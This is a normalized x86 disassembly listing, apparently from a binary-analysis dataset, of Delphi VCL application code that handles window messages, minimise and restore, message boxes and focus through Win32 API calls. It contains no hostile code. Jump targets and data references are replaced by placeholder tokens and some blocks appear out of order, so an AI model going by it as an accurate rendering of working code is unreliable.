mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x1
jne r-xdata
add eax 0xfffffff2
sub eax 0x2
jb r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
sub eax 0xb01a
je r-xdata
mov esi eax
mov eax esi
call sub_43b290
test eax eax
je r-xdata
sub eax 0xb001
je r-xdata
je r-xdata
sub eax 0x37
je r-xdata
je r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
cmp eax 0x14
ja r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0xb0 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xb0 ]
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x8 ]
mov eax [ ebp - 0x8 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4556bc
and eax 0x7f
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
mov eax [ ebp - 0x4 ]
call sub_4542ac
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
mov eax [ ebp - 0x4 ]
call sub_454250
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call IsIconic
test eax eax
jne r-xdata
sub eax 0x5
je r-xdata
mov eax esi
call sub_43b290
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x10a ] 0x0
je r-xdata
sub eax 0x15
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x112 ] 0x0
je r-xdata
sub eax 0x112
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_453d74
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
sub eax 0x13
je r-xdata
mov eax [ rw-data ]
call sub_452b28
push ebp
call sub_4535e8
pop ecx
jmp r-xdata
sub eax 0x1a
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x9c ] 0x1
jmp r-xdata
push ebp
call sub_4535e8
pop ecx
jmp [ eax * 4 + jump_table_453714 ]
call GetFocus
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x30 ]
jne r-xdata
jmp r-xdata
mov eax esi
call sub_43b290
push eax
call IsWindowVisible
test eax eax
je r-xdata
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x10c ]
call [ ebx + 0x108 ]
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_454128
test al al
je r-xdata
jmp r-xdata
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x114 ]
call [ ebx + 0x110 ]
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
and eax 0xfff0
sub eax 0xf020
je r-xdata
add eax 0xffffffe0
sub eax 0x7
jb r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
cmp [ eax ] 0xde534454
jne r-xdata
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x4 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_43fbe8
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_45357c
push ebp
call sub_4535e8
pop ecx
jmp r-xdata
sub eax 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call IsIconic
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax ] 0x27
push ebp
call sub_4535e8
pop ecx
jmp r-xdata
push 0x0
push 0x0
push 0xb01a
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call PostMessageA
push ebp
call sub_4535e8
pop ecx
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
xor eax eax
call sub_419658
jmp r-xdata
xor eax eax
call sub_44b4a8
test eax eax
je r-xdata
mov [ rw-data ] 0x0
call GetFocus
mov ebx eax
mov eax esi
call sub_43b290
push eax
call SetFocus
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x4 ]
mov edx 0x112
mov eax esi
call sub_435c5c
push ebx
call SetFocus
mov [ rw-data ] 0x1
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_453d90
jmp r-xdata
sub eax 0x100
je r-xdata
mov esi [ ebp - 0x8 ]
mov esi [ esi + 0x8 ]
push esi
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
add ebx 0xbc00
push ebx
mov eax [ ebp - 0x8 ]
push esi
call SendMessageA
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
sub eax 0x1e1
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x9e ] 0x0
je r-xdata
push ebp
call sub_4535e8
pop ecx
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x1
sbb eax eax
inc eax
mov edx [ ebp - 0x4 ]
mov [ edx + 0x9d ] al
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
jmp r-xdata
call sub_450d28
jmp r-xdata
push ebp
call sub_4535e8
pop ecx
jmp r-xdata
push ebp
call sub_453624
pop ecx
jmp r-xdata
push ebp
call sub_4535e8
pop ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xac ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_453488
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xac ]
test eax eax
je r-xdata
push eax
call SetFocus
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_453e40
jmp r-xdata
jmp r-xdata
call sub_4279c8
call sub_427aa8
test al al
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xa0 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_453478
push 0x0
push 0x0
push 0xb001
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call PostMessageA
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_453488
push 0x0
push 0x0
push 0xb000
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call PostMessageA
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_453480
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_44b358
mov edx [ ebp - 0x4 ]
mov [ edx + 0xac ] eax
push ebp
call sub_4535e8
pop ecx
jmp r-xdata
call sub_44b40c
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0xac ] edx
push ebp
call sub_4535e8
pop ecx
jmp r-xdata
call sub_4279c8
call sub_427b04
jmp r-xdata
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0xc ] edx
jmp r-xdata
mov edx 0x8000
mov eax r-xdata
call sub_40cd4c
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa0 ] ebx
test ebx ebx
je r-xdata
call GetLastError
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0xa0 ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0xc ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa0 ]
push eax
call GetProcAddress
mov esi eax
mov ebx esi
test esi esi
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ eax + 0x8 ]
push edx
mov edx [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
call ebx
jmp r-xdata
sub_453d90
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x30 ]
push eax
call IsIconic
test eax eax
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_453478
mov eax [ ebx + 0x30 ]
push eax
call SetActiveWindow
cmp [ ebx + 0x44 ] 0x0
je r-xdata
mov edx 0x6
mov eax [ ebx + 0x30 ]
call sub_452da8
cmp [ ebx + 0x5b ] 0x0
jne r-xdata
mov edx ebx
mov eax [ ebx + 0x11c ]
call [ ebx + 0x118 ]
mov eax [ ebx + 0x44 ]
call sub_43b290
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax [ ebx + 0x44 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
push 0x40
push 0x0
mov esi [ ebx + 0x44 ]
mov eax [ esi + 0x48 ]
push eax
mov eax [ esi + 0x44 ]
push eax
mov eax [ esi + 0x40 ]
push eax
mov eax [ ebx + 0x44 ]
call sub_43b290
push eax
mov eax [ ebx + 0x30 ]
push eax
call SetWindowPos
push 0x0
push 0xf020
push 0x112
mov eax [ ebx + 0x30 ]
push eax
call DefWindowProcA
jmp r-xdata
cmp [ ebx + 0x11a ] 0x0
je r-xdata
sub_453e40
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x30 ]
push eax
call IsIconic
test eax eax
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x30 ]
push eax
call SetActiveWindow
cmp [ ebx + 0x44 ] 0x0
je r-xdata
mov edx 0x9
mov eax [ ebx + 0x30 ]
call sub_452da8
cmp [ ebx + 0x5b ] 0x0
jne r-xdata
push eax
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
adc eax 0x0
mov eax [ ebx + 0x44 ]
call sub_43b290
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax [ ebx + 0x44 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
push eax
push 0x0
mov eax [ ebx + 0x30 ]
push eax
call SetWindowPos
mov eax [ ebx + 0x44 ]
test eax eax
je r-xdata
adc eax 0x0
push 0x0
push 0xf120
push 0x112
mov eax [ ebx + 0x30 ]
push eax
call DefWindowProcA
jmp r-xdata
mov eax ebx
call sub_453488
mov eax [ rw-data ]
mov esi [ eax + 0x64 ]
test esi esi
je r-xdata
cmp [ eax + 0x22b ] 0x1
jne r-xdata
push 0x40
push 0x0
push 0x0
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
cmp [ ebx + 0x122 ] 0x0
je r-xdata
mov eax esi
call sub_43b290
push eax
call SetFocus
cmp [ eax + 0x57 ] 0x0
jne r-xdata
mov edx ebx
mov eax [ ebx + 0x124 ]
call [ ebx + 0x120 ]
xor edx edx
call sub_44eab4
mov eax [ ebx + 0x44 ]
call sub_450ed0
sub_453f40
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
push eax
call GetLastActivePopup
mov esi eax
test esi esi
je r-xdata
cmp esi [ ebx + 0x30 ]
je r-xdata
push esi
call IsWindowVisible
test eax eax
je r-xdata
push esi
call IsWindowEnabled
test eax eax
je r-xdata
push esi
call SetForegroundWindow
sub_453f7c
push ebx
push esi
add esp 0xffffff00
mov esi edx
mov ebx eax
cmp [ ebx + 0xa4 ] 0x0
je r-xdata
mov eax esi
mov edx [ ebx + 0x8c ]
call sub_403f08
push 0x100
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x30 ]
push eax
call GetWindowTextA
mov ecx eax
mov edx esp
mov eax esi
call sub_403fa4
jmp r-xdata
add esp 0x100
pop esi
pop ebx
retn
sub_453fc8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
mov esi [ ebx + 0xb0 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
push edi
push esi
call IsDialogMessageA
cmp eax 0x1
sbb eax eax
inc eax
sub_453fec
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x22f ] 0x2
jne r-xdata
mov edx [ rw-data ]
cmp [ edx + 0x6c ] 0x0
je r-xdata
mov edx [ rw-data ]
mov edx [ edx + 0x6c ]
cmp [ edx + 0x22f ] 0x1
jne r-xdata
push edi
mov eax [ esi + 0x254 ]
push eax
call TranslateMDISysAccel
cmp eax 0x1
sbb eax eax
inc eax
sub_45403c
push ebx
push esi
push edi
push ebp
mov esi edx
mov edi eax
xor ebx ebx
mov eax [ esi + 0x4 ]
cmp eax 0x100
jb r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp eax 0x108
ja r-xdata
call GetCapture
mov ebp eax
test ebp ebp
jne r-xdata
push 0xfffffffa
push ebp
call GetWindowLongA
cmp eax [ rw-data ]
jne r-xdata
mov ebp [ esi ]
mov eax [ edi + 0x44 ]
test eax eax
je r-xdata
mov eax [ esi + 0xc ]
push eax
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
add eax 0xbc00
push eax
push ebp
call SendMessageA
test eax eax
je r-xdata
mov eax ebp
call sub_431970
test eax eax
jne r-xdata
cmp ebp [ eax + 0x254 ]
jne r-xdata
mov bl 0x1
test ebp ebp
jne r-xdata
test ebp ebp
jne r-xdata
call sub_43b290
mov ebp eax
jmp r-xdata
mov eax [ esi + 0xc ]
push eax
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
add eax 0xbc00
push eax
push ebp
call SendMessageA
test eax eax
je r-xdata
mov ebp [ esi ]
push ebp
call GetParent
mov ebp eax
mov bl 0x1
jmp r-xdata
sub_4540f4
push ebx
push esi
push edi
push ebp
mov edi edx
mov ebp eax
xor ebx ebx
mov esi [ ebp + 0x84 ]
test esi esi
je r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xdc ]
test al al
je r-xdata
mov eax ebp
call sub_455054
sub_454128
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov ebx eax
mov [ esp ] 0x0
cmp [ ebx + 0x12a ] 0x0
je r-xdata
cmp [ esp ] 0x0
jne r-xdata
mov ecx esp
mov edx ebp
mov eax [ ebx + 0x12c ]
call [ ebx + 0x128 ]
mov al 0x1
mov edi [ ebx + 0x44 ]
test edi edi
je r-xdata
xor eax eax
jmp r-xdata
mov eax edi
call sub_43b290
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov [ esp ] al
mov al [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebp
mov eax [ ebx + 0x44 ]
mov si 0xffab
call sub_4032f4
test al al
jne r-xdata
sub_454194
push ebx
push esi
push edi
push ecx
mov edi edx
mov esi eax
xor ebx ebx
push 0x1
push 0x0
push 0x0
push 0x0
push edi
call PeekMessageA
test eax eax
je r-xdata
mov eax ebx
pop edx
pop edi
pop esi
pop ebx
retn
mov bl 0x1
cmp [ edi + 0x4 ] 0x12
je r-xdata
mov [ esi + 0x9c ] 0x1
mov [ esp ] 0x0
cmp [ esi + 0xda ] 0x0
je r-xdata
mov edx edi
mov eax esi
call sub_4540f4
test al al
jne r-xdata
mov ecx esp
mov edx edi
mov eax [ esi + 0xdc ]
call [ esi + 0xd8 ]
cmp [ esp ] 0x0
jne r-xdata
mov edx edi
mov eax esi
call sub_453fec
test al al
jne r-xdata
mov edx edi
mov eax esi
call sub_45403c
test al al
jne r-xdata
mov edx edi
mov eax esi
call sub_453fc8
test al al
jne r-xdata
push edi
call TranslateMessage
push edi
call DispatchMessageA
jmp r-xdata
sub_45422c
push ebx
add esp 0xffffffe4
mov ebx eax
mov edx esp
mov eax ebx
call sub_454194
test al al
jne r-xdata
add esp 0x1c
pop ebx
retn
mov edx esp
mov eax ebx
call sub_454afc
sub_454250
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebx + 0xa4 ] 0x0
jne r-xdata
mov eax [ ebx + 0xa8 ]
call sub_4139d4
mov eax 0x8
call sub_4026cc
mov edx [ ebp + 0x8 ]
mov [ eax ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x4 ] edx
mov edx eax
mov eax [ ebx + 0xa8 ]
call sub_413898
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop ebx
pop ebp
retn 0x8
lea edx [ ebp + 0x8 ]
push edx
push 0x0
push 0xb020
push eax
call SendMessageA
jmp r-xdata
sub_4542ac
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0xa4 ] 0x0
jne r-xdata
mov eax [ ebx + 0xa8 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
inc edi
xor esi esi
lea edx [ ebp + 0x8 ]
push edx
push 0x1
push 0xb020
push eax
call SendMessageA
jmp r-xdata
inc esi
dec edi
jne r-xdata
mov edx [ ebp + 0xc ]
cmp edx [ eax + 0x4 ]
jne r-xdata
mov edx esi
mov eax [ ebx + 0xa8 ]
call sub_4139f4
mov edx [ eax ]
cmp edx [ ebp + 0x8 ]
jne r-xdata
mov edx 0x8
call sub_4026ec
mov edx esi
mov eax [ ebx + 0xa8 ]
call sub_4138e4
jmp r-xdata
sub_454340
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
mov eax ebx
call [ eax - 0xc ]
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax ] ebx
xor eax eax
push ebp
push sub_45437e
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
or edx 0xffffffff
mov eax ebx
mov edi [ eax ]
call [ edi + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp [ esi + 0x44 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_403284
test al al
je r-xdata
mov edi ebx
mov eax edi
call sub_43b26c
mov [ esi + 0x44 ] edi
sub_4543c0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa5 ] 0x1
xor edx edx
push ebp
push sub_45449e
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax sub_44b2d0
call sub_407960
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4544a5
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa5 ] 0x0
retn
mov edx [ rw-data ]
mov edx [ edx ]
sub edx 0x3
je r-xdata
mov dl 0x2
call sub_44eab4
sub edx 0x4
jne r-xdata
xor eax eax
push ebp
push j_sub_403580#5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_45422c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
cmp [ eax + 0x22b ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5b ] 0x0
je r-xdata
mov [ eax + 0x22b ] 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x9c ] 0x0
je r-xdata
mov dl 0x1
call sub_44d9bc
mov eax [ ebp - 0x4 ]
call sub_453d90
jmp r-xdata
sub_4544c0
push ebx
push esi
mov esi edx
mov ebx eax
call GetCapture
test eax eax
je r-xdata
call sub_40275c
mov edx [ r-xdata ]
call sub_403284
test al al
je r-xdata
push 0x0
push 0x0
push 0x1f
call GetCapture
push eax
call SendMessageA
call sub_40277c
push eax
call sub_40275c
pop edx
call sub_40b264
call sub_40275c
mov edx [ rw-data ]
call sub_403284
test al al
jne r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0xd2 ] 0x0
je r-xdata
call sub_40275c
mov edx eax
mov eax ebx
call sub_4546b8
pop esi
pop ebx
retn
call sub_40275c
mov ecx eax
mov edx esi
mov eax [ ebx + 0xd4 ]
call [ ebx + 0xd0 ]
jmp r-xdata
sub_454550
push ebp
mov ebp esp
add esp 0xffffffac
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
call GetActiveWindow
mov [ ebp - 0xc ] eax
push 0x2
mov eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0x14 ] eax
push 0x2
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
je r-xdata
xor eax eax
call sub_44b358
mov [ ebp - 0x10 ] eax
call sub_44b274
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x4 ]
call sub_4534f4
test al al
je r-xdata
mov [ ebp - 0x44 ] 0x28
lea eax [ ebp - 0x44 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
lea eax [ ebp - 0x54 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call GetWindowRect
push 0x1d
push 0x0
push 0x0
mov ecx [ ebp - 0x34 ]
mov edx [ ebp - 0x3c ]
sub ecx edx
sar ecx 0x1
jns r-xdata
xor ecx ecx
push ebp
push sub_4546a5
push [ fs : ecx ]
mov [ fs : ecx ] esp
push ebx
push edi
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call MessageBoxA
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4546ac
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
je r-xdata
or ebx 0x100000
add ecx edx
push ecx
mov edx [ ebp - 0x38 ]
mov eax [ ebp - 0x40 ]
sub edx eax
sar edx 0x1
jns r-xdata
adc ecx 0x0
mov eax [ ebp - 0x10 ]
call sub_44b40c
mov eax [ ebp - 0xc ]
push eax
call SetActiveWindow
mov eax [ ebp - 0x1c ]
call sub_44b27c
retn
push 0x1d
push 0x0
push 0x0
mov ecx [ ebp - 0x48 ]
mov edx [ ebp - 0x50 ]
sub ecx edx
sar ecx 0x1
jns r-xdata
add edx eax
push edx
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call SetWindowPos
adc edx 0x0
add ecx edx
push ecx
mov edx [ ebp - 0x4c ]
mov eax [ ebp - 0x54 ]
sub edx eax
sar edx 0x1
jns r-xdata
adc ecx 0x0
add edx eax
push edx
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call SetWindowPos
adc edx 0x0
sub_4546b8
push ebp
mov ebp esp
add esp 0xfffffef8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x108 ] ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_454773
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx [ esi + 0x4 ]
call sub_403f4c
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push 0x10
lea edx [ ebp - 0x108 ]
mov eax ebx
call sub_453f7c
mov eax [ ebp - 0x108 ]
call sub_404374
push eax
mov eax [ ebp - 0x4 ]
call sub_404374
mov edx eax
mov eax ebx
pop ecx
call sub_454550
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45477a
lea eax [ ebp - 0x108 ]
call sub_403eb4
lea eax [ ebp - 0x4 ]
call sub_403eb4
retn
mov eax [ ebp - 0x4 ]
call sub_408268
mov edx eax
lea eax [ ebp - 0x104 ]
call sub_402bf8
lea eax [ ebp - 0x104 ]
mov edx r-xdata
call sub_402a10
jbe r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_40417c
sub_454790
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] dx
mov esi eax
xor ebx ebx
mov [ esp + 0x8 ] 0x1
mov eax [ rw-data ]
mov edi [ eax + 0x68 ]
test edi edi
je r-xdata
cmp [ esi + 0xf2 ] 0x0
je r-xdata
cmp [ edi + 0x2aa ] 0x0
je r-xdata
test edi edi
je r-xdata
lea eax [ esp + 0x8 ]
push eax
mov ecx [ esp + 0x8 ]
mov dx [ esp + 0x4 ]
mov eax [ esi + 0xf4 ]
call [ esi + 0xf0 ]
mov ebx eax
lea eax [ esp + 0x8 ]
push eax
mov ecx [ esp + 0x8 ]
mov dx [ esp + 0x4 ]
mov eax [ edi + 0x2ac ]
call [ edi + 0x2a8 ]
mov ebx eax
jmp r-xdata
cmp [ esp + 0x8 ] 0x0
je r-xdata
test [ edi + 0x1c ] 0x10
je r-xdata
mov eax ebx
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
test bl bl
jne r-xdata
mov eax edi
call sub_43b42c
cmp ax 0xffff
jne r-xdata
mov [ esp + 0x8 ] 0x0
test edi edi
je r-xdata
cmp [ edi + 0x57 ] 0x0
jne r-xdata
cmp [ esi + 0x50 ] 0x0
je r-xdata
mov eax edi
call sub_43b594
test al al
je r-xdata
cmp [ edi + 0x220 ] 0x0
jne r-xdata
cmp [ esi + 0xa4 ] 0x0
jne r-xdata
mov ebp [ esi + 0x30 ]
mov eax [ esi + 0x44 ]
test eax eax
je r-xdata
cmp [ edi + 0x23c ] 0x0
je r-xdata
mov [ esp + 0x8 ] 0x0
mov eax [ esp + 0x4 ]
push eax
movzx eax [ esp + 0x4 ]
push eax
push 0xb01f
mov eax [ esi + 0x30 ]
push eax
call PostMessageA
mov eax esi
call sub_454e34
test al al
je r-xdata
call sub_43b290
mov ebp eax
mov eax edi
call sub_43b290
mov ebp eax
mov eax esi
call sub_454e34
test al al
je r-xdata
mov ax [ esp ]
push eax
mov eax [ esp + 0x8 ]
push eax
mov ecx [ esi + 0x50 ]
mov edx ebp
mov eax [ esi + 0x4c ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov ebx eax
jmp r-xdata
mov ax [ esp ]
push eax
mov eax [ esp + 0x8 ]
push eax
mov ecx [ edi + 0x23c ]
mov edx ebp
mov eax [ esi + 0x4c ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov ebx eax
jmp r-xdata
sub_4548f8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_454950
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
mov eax esi
call sub_454e34
test al al
je r-xdata
xor ebx ebx
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_455680
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ esi + 0x4c ]
mov esi [ eax ]
call [ esi + 0xc ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_454957
lea eax [ ebp - 0x4 ]
call sub_403eb4
retn
sub_454960
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_4549b8
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
mov eax esi
call sub_454e34
test al al
je r-xdata
xor ebx ebx
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_455680
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ esi + 0x4c ]
mov esi [ eax ]
call [ esi + 0x10 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4549bf
lea eax [ ebp - 0x4 ]
call sub_403eb4
retn
sub_4549d0
push ebx
push esi
mov ebx eax
cmp dl [ ebx + 0x88 ]
je r-xdata
pop esi
pop ebx
retn
mov eax edx
mov [ ebx + 0x88 ] al
test al al
je r-xdata
mov eax [ ebx + 0x84 ]
call sub_4030f8
xor eax eax
mov [ ebx + 0x84 ] eax
mov ecx ebx
mov dl 0x1
mov eax [ rw-data ]
call [ eax + 0x2c ]
mov esi eax
mov [ ebx + 0x84 ] esi
mov edx [ ebx + 0x5c ]
mov eax esi
call sub_434c30
jmp r-xdata
sub_454a20
push ebx
push esi
push edi
mov eax [ rw-data ]
call sub_451fcc
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov eax ebx
call sub_43b290
push eax
call IsWindowVisible
test eax eax
je r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_451fb8
mov ebx eax
mov eax ebx
call sub_43b594
test al al
je r-xdata
mov eax ebx
call sub_43b290
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xdc ]
sub_454a84
push ebx
push esi
push edi
add esp 0xfffffff8
mov ebx eax
